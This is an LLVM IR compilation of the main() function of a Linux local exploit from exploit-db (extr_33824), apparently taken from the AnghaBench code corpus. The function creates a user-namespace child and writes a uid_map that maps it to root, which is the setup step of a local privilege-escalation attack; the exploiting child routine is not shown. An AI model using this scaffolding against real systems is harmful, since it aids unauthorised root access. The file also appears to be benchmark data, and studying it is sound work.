; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_33824.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_33824.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.args = type { i8*, i32* }

@PATH_MAX = common dso_local global i32 0, align 4
@child = common dso_local global i32 0, align 4
@child_stack = common dso_local global i64 0, align 8
@STACK_SIZE = common dso_local global i64 0, align 8
@CLONE_NEWUSER = common dso_local global i32 0, align 4
@SIGCHLD = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [8 x i8] c"0 %d 1\0A\00", align 1
@.str.1 = private unnamed_addr constant [18 x i8] c"/proc/%ld/uid_map\00", align 1
@O_RDWR = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca [1024 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.args, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %11 = load i32, i32* @PATH_MAX, align 4
  %12 = zext i32 %11 to i64
  %13 = call i8* @llvm.stacksave()
  store i8* %13, i8** %8, align 8
  %14 = alloca i8, i64 %12, align 16
  store i64 %12, i64* %9, align 8
  %15 = load i32, i32* %3, align 4
  %16 = icmp eq i32 %15, 2
  %17 = zext i1 %16 to i32
  %18 = call i32 @assert(i32 %17)
  %19 = load i8**, i8*** %4, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 1
  %21 = load i8*, i8** %20, align 8
  %22 = getelementptr inbounds %struct.args, %struct.args* %10, i32 0, i32 0
  store i8* %21, i8** %22, align 8
  %23 = getelementptr inbounds %struct.args, %struct.args* %10, i32 0, i32 1
  %24 = load i32*, i32** %23, align 8
  %25 = call i32 @pipe(i32* %24)
  %26 = icmp ne i32 %25, -1
  %27 = zext i1 %26 to i32
  %28 = call i32 @assert(i32 %27)
  %29 = load i32, i32* @child, align 4
  %30 = load i64, i64* @child_stack, align 8
  %31 = load i64, i64* @STACK_SIZE, align 8
  %32 = add nsw i64 %30, %31
  %33 = load i32, i32* @CLONE_NEWUSER, align 4
  %34 = load i32, i32* @SIGCHLD, align 4
  %35 = or i32 %33, %34
  %36 = call i32 @clone(i32 %29, i64 %32, i32 %35, %struct.args* %10)
  store i32 %36, i32* %6, align 4
  %37 = load i32, i32* %6, align 4
  %38 = icmp ne i32 %37, -1
  %39 = zext i1 %38 to i32
  %40 = call i32 @assert(i32 %39)
  %41 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %42 = call i32 (...) @getuid()
  %43 = sext i32 %42 to i64
  %44 = call i32 @snprintf(i8* %41, i32 1024, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i64 %43)
  %45 = load i32, i32* @PATH_MAX, align 4
  %46 = load i32, i32* %6, align 4
  %47 = sext i32 %46 to i64
  %48 = call i32 @snprintf(i8* %14, i32 %45, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.1, i64 0, i64 0), i64 %47)
  %49 = load i32, i32* @O_RDWR, align 4
  %50 = call i32 @open(i8* %14, i32 %49)
  store i32 %50, i32* %5, align 4
  %51 = load i32, i32* %5, align 4
  %52 = icmp ne i32 %51, -1
  %53 = zext i1 %52 to i32
  %54 = call i32 @assert(i32 %53)
  %55 = load i32, i32* %5, align 4
  %56 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %57 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %58 = call i64 @strlen(i8* %57)
  %59 = call i64 @write(i32 %55, i8* %56, i64 %58)
  %60 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %61 = call i64 @strlen(i8* %60)
  %62 = icmp eq i64 %59, %61
  %63 = zext i1 %62 to i32
  %64 = call i32 @assert(i32 %63)
  %65 = getelementptr inbounds %struct.args, %struct.args* %10, i32 0, i32 1
  %66 = load i32*, i32** %65, align 8
  %67 = getelementptr inbounds i32, i32* %66, i64 1
  %68 = load i32, i32* %67, align 4
  %69 = call i32 @close(i32 %68)
  %70 = load i32, i32* %6, align 4
  %71 = call i32 @waitpid(i32 %70, i32* null, i32 0)
  %72 = icmp ne i32 %71, -1
  %73 = zext i1 %72 to i32
  %74 = call i32 @assert(i32 %73)
  %75 = load i8*, i8** %8, align 8
  call void @llvm.stackrestore(i8* %75)
  ret i32 0
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @assert(i32) #2

declare dso_local i32 @pipe(i32*) #2

declare dso_local i32 @clone(i32, i64, i32, %struct.args*) #2

declare dso_local i32 @snprintf(i8*, i32, i8*, i64) #2

declare dso_local i32 @getuid(...) #2

declare dso_local i32 @open(i8*, i32) #2

declare dso_local i64 @write(i32, i8*, i64) #2

declare dso_local i64 @strlen(i8*) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @waitpid(i32, i32*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
